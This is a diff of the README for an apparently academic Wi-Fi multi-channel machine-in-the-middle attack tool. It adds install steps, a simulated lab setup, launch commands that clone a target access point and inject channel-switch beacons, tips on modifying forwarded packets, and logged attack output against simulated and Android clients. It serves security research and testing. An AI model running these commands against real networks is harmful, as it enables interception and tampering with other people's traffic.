@@ -16,14 +16,18 @@ and [FragAttacks](https://fragattacks.com) research.
 <a id="id-prerequisites"></a>
 # 2. Prerequisites
 
-The test tool was tested on Ubuntu 20.04 (**TODO: Verify this again.**). To install
-the required dependencies, execute:
+The test tool was tested on Ubuntu 22.04. To install the required dependencies, execute:
 
 	# Ubuntu:
 	sudo apt-get update
 	sudo apt-get install libnl-3-dev libnl-genl-3-dev libnl-route-3-dev libssl-dev \
 		libdbus-1-dev git pkg-config build-essential macchanger net-tools virtualenv \
-		rfkill
+		rfkill hostapd
+
+Then clone this repository **and its submodules**:
+
+	git clone https://github.com/vanhoefm/mc-mitm.git --recursive
+	cd mc-mitm
 
 Now build the tools and configure a virtual python3 environment:
 
@@ -34,8 +38,9 @@ Now build the tools and configure a virtual python3 environment:
 	# Configure python environment
 	./pysetup.sh
 
-The above instructions only have to be executed once. After pulling in new code using git you
-have to recompile the modified Hostapd again.
+The above instructions only have to be executed once. After pulling in new code assure that
+any submodules are updated be executing `git submodule update`. Remember to also recompile
+the modified Hostapd after pulling in new code.
 
 
 <a id="launch-attack"></a>
@@ -43,9 +48,9 @@ have to recompile the modified Hostapd again.
 
 The attack **requires two wireless network cards** and you must be within radio distance of both
 the client and the AP. The most reliable network card is one based on [`ath9k_htc`](https://wikidevi.wi-cat.ru/Ath9k_htc).
-An example is a [Technoethical N150 HGA](https://tehnoetic.com/tet-n150hga).
+An example is a [Technoethical N150 HGA](https://tehnoetic.com/tet-n150hga). You can also use
+`mac80211_hwsim` on Linux to use this script with simulated interfaces.
 
-The attack consists of two steps:
 
 ## 3.1. Starting the Machine-in-the-Middle
 
@@ -63,7 +68,7 @@ You can then start the attack tool by executing:
 
 The parameters are as follows:
 
-- `wlan1`: this is the wireless network card that will listen to traffic on the channel of the target AP.
+- `wlan1`: this is the wireless network card that will listen to traffic on the channel of the target (real) AP.
 
 - `wlan2`: this is the wireless network card that will advertise a rogue clone of the target AP on a different channel.
 
@@ -77,15 +82,51 @@ The parameters are as follows:
 
 You can execute the script before or after the targeted client connects to the network. If you want
 to intercept or target the connection process you have to start the script first and then connect
-with the target client to the network. Otherwise, when targeting data frames. The script will output
-**"Established MitM position against client"** in green when the machine-in-the-middle position has been
-successfully established.
+with the target client to the network. Otherwise, when targeting data frames, you can first start the
+client and afterwards start the script. The script will output **"Established MitM position against client"**
+in green when the machine-in-the-middle position has been successfully established.
+
+Optional arguments:
+
+- `--debug`: output extra debugging information.
+
+
+## 3.2. Example with simulated interfaces
+
+You can try out the script, and confirm that basic functionality works, by running the
+script in a simualted test environment (e.g., in a virtual machine). This is done by
+using simualted Linux Wi-Fi interface. Enable these simulated interfaces as follows:
+
+	modprobe mac80211_hwsim radios=4
+
+Now run the example target (real) AP that we will attack:
+
+	# We use the unmodified hostapd instance of the operating system
+	cd mc-mitm
+	sudo hostapd hostapd/hostapd_example.conf
+
+Let's now start the machine-in-the-middle script that will wait for a victim to connect:
+
+	cd mc-mitm/research
+	sudo su
+	source venv/bin/activate
+	./mc-mitm.py wlan2 wlan3 testnetwork --target 02:00:00:00:01:00 --continuous-csa --tid
+
+Notice that in this example we will target a specific client MAC address. Targeting
+a specific test client improves the reliability of the attack (frames will be acknowleged
+and not needlessly retransmitted). Now start the victim client:
+
+	cd mc-mitm
+	sudo wpa_supplicant -D nl80211 -i wlan1 -c wpa_supplicant/client_example.conf
+
+The script should now established a MitM between the client and AP. See [example output](#example)
+for the expected output of the script.
 
 
 <a id="notes"></a>
 # 4. Experimental notes
 
-To experiment with the attack in practice I have found it useful to:
+To experiment with the attack in practice, with real Wi-Fi dongles, I have found it useful to:
 
 - Put the target network on channel 1 or 11. The rogue AP will be put on a "far away" channel, reducing
   possible cross-channel interference in the multi-channel MitM.
@@ -100,8 +141,17 @@ To experiment with the attack in practice I have found it useful to:
 - You can extend the functions `should_forward` and `modify_packet` to perform attacks once a MC-MitM has
   been established. These functions control whether packets are forwarded and/or modified, respectively.
 
+- When targeting security configurations that different from a usual WPA2 configs, you will likely have
+  to update the code in `NetworkConfig` that parses a beacon to generate a hostapd config that results
+  in a beacon with the same RSNE element.
+
+  An alternative might be to modify Hostapd functions such as `ieee802_11_build_ap_params` and
+  `hostapd_gen_probe_resp` and directly write the desired beacon and probe response content to the buffer.
+  And it seems that beacon parameters can change while the AP is already running, see calls to
+  `ieee802_11_update_beacons` from the control interface.
+
 - See the [KRACK all-zero key PoC](https://github.com/vanhoefm/krackattacks-poc-zerokey/blob/research/krackattack/krack-all-zero-tk.py)
-  for an example attack based on this code.
+  for an example MitM attack using largely similar code.
 
 - Read the [design discussion](research/mc-mitm.py#L8) to understand _why_ the interfaces are configured
   in the way they are. The main difficulty is assuring that frame acknowledgement and retransmission works
@@ -117,13 +167,59 @@ To experiment with the attack in practice I have found it useful to:
   Or use the [ModWifi C implementation](https://github.com/vanhoefm/modwifi#channel-mitm-and-tkip-broadcast-attack),
   but that's harder to modify.
 
-- Against Android, the MC-MitM could be established at all points.
+- Against Android, the MC-MitM could be established while the client is connecting and while the client was
+  already connected. In other words, the tested Android device (Pixel 4 XL) was not affected by the above
+  time constraints of Linux.
 
 
 <a id="example"></a>
 # 6. Example output
 
-Anonymized example output against Android is:
+## Against simulated Linux interfaces (Aug 27, 2022)
+
+Notice that the `--debug` parameter is used to increase debug output:
+
+	(venv) root@mathy-VirtualBox:/home/mathy/mc-mitm/research# ./mc-mitm.py wlan2 wlan3 testnetwork --target 02:00:00:00:01:00 --continuous-csa --debug
+	[13:32:52] Note: remember to disable Wi-Fi in your network manager so it doesn't interfere with this script
+	[13:32:52] Note: keep >1 meter between interfaces. Else packet delivery is unreliable & target may disconnect
+	[13:32:53] Monitor mode: using wlan2 on real channel and wlan3mon on rogue channel.
+	[13:32:53] Target network 02:00:00:00:00:00 detected on channel 1
+	[13:32:53] Will use wlan3 to create rogue AP on channel 11
+	[13:32:53] Setting MAC address of wlan3 to 02:00:00:00:00:00
+	[13:32:53] Attaching filter to wlan2: (wlan type data or wlan type mgt) and ((wlan addr1 02:00:00:00:00:00) or (wlan addr2 02:00:00:00:00:00) or (wlan addr1 02:00:00:00:01:00) or (wlan addr2 02:00:00:00:01:00))
+	[13:32:53] Attaching filter to wlan3mon: (wlan type data or wlan type mgt) and ((wlan addr1 02:00:00:00:00:00) or (wlan addr2 02:00:00:00:00:00) or (wlan addr1 02:00:00:00:01:00) or (wlan addr2 02:00:00:00:01:00))
+	[13:32:53] Giving the rogue hostapd one second to initialize ...
+	[13:32:54] Injected 4 CSA beacon pairs (moving stations to channel 11)
+	[13:33:00] Real channel : 02:00:00:00:01:00 -> ff:ff:ff:ff:ff:ff: ProbeReq(seq=398)
+	[13:33:00] Real channel : 02:00:00:00:00:00 -> 02:00:00:00:01:00: ProbeResp(seq=39)
+	[13:33:00] Rogue channel: 02:00:00:00:01:00 -> ff:ff:ff:ff:ff:ff: ProbeReq(seq=408)
+	[13:33:03] Rogue channel: 02:00:00:00:01:00 -> 02:00:00:00:00:00: Auth(seq=409, status=0) -- MitM'ing
+		   Client 02:00:00:00:01:00 moved to state GotMitm
+		   Established MitM position against client 02:00:00:00:01:00
+		   Sending fake auth to rouge AP to register client
+	[13:33:03] Sent frame to hostapd: Auth(seq=0, status=0)
+	[13:33:03] Real channel : 02:00:00:00:00:00 -> 02:00:00:00:01:00: Auth(seq=40, status=0) -- MitM'ing
+	[13:33:03] Rogue channel: 02:00:00:00:01:00 -> 02:00:00:00:00:00: AssoReq(seq=410) -- MitM'ing
+	[13:33:03] Sent frame to hostapd: AssoReq(seq=410)
+	[13:33:03] Real channel : 02:00:00:00:00:00 -> 02:00:00:00:01:00: AssoResp(seq=41, status=0) -- MitM'ing
+	[13:33:03] Real channel : 02:00:00:00:00:00 -> 02:00:00:00:01:00: EAPOL-Msg1(seq=0, replay=1) -- MitM'ing
+	[13:33:03] Rogue channel: 02:00:00:00:01:00 -> 02:00:00:00:00:00: EAPOL-Msg2(seq=0, replay=1) -- MitM'ing
+	[13:33:04] Real channel : 02:00:00:00:00:00 -> 02:00:00:00:01:00: EAPOL-Msg3(seq=1, replay=2) -- MitM'ing
+	[13:33:04] Rogue channel: 02:00:00:00:01:00 -> 02:00:00:00:00:00: EAPOL-Msg4(seq=1, replay=2) -- MitM'ing
+	[13:33:04] Rogue hostapd: nl80211: sta_remove -> DEL_STATION wlan3 02:00:00:00:01:00 --> -2 (No such file or directory)
+	[13:33:04] Rogue hostapd: nl80211: Add STA 02:00:00:00:01:00
+	[13:33:04] Rogue hostapd: send_auth_reply: not sending own authentication reply
+	[13:33:04] Rogue hostapd: send_auth_reply: not sending own authentication reply
+	[13:33:04] Rogue hostapd: send_assoc_resp: not sending association reply (status=0)
+	[13:33:04] Rogue hostapd: __wpa_send_eapol: not sending EAPOL frame
+	[13:33:04] Rogue hostapd: nl80211: sta_remove -> DEL_STATION wlan3 02:00:00:00:01:00 --> 0 (Success)
+	[13:33:04] Rogue hostapd: nl80211: Add STA 02:00:00:00:01:00
+	[13:33:04] Rogue hostapd: send_assoc_resp: not sending association reply (status=0)
+	[13:33:04] Rogue hostapd: __wpa_send_eapol: not sending EAPOL frame
+	[13:33:04] Rogue hostapd: wpa_receive: Igning all EAPOL frames
+
+
+## Against Android device (May 8, 2022)
 
 	(venv) [root@zbook-mathy research]# ./mc-mitm.py wlp0s20f0u1 wlp0s20f3 testnetwork --debug -t 00:11:11:11:11:11 --strict-echo-test --continuous-csa
 	[01:34:44] Note: remember to disable Wi-Fi in your network manager so it doesn't interfere with this script
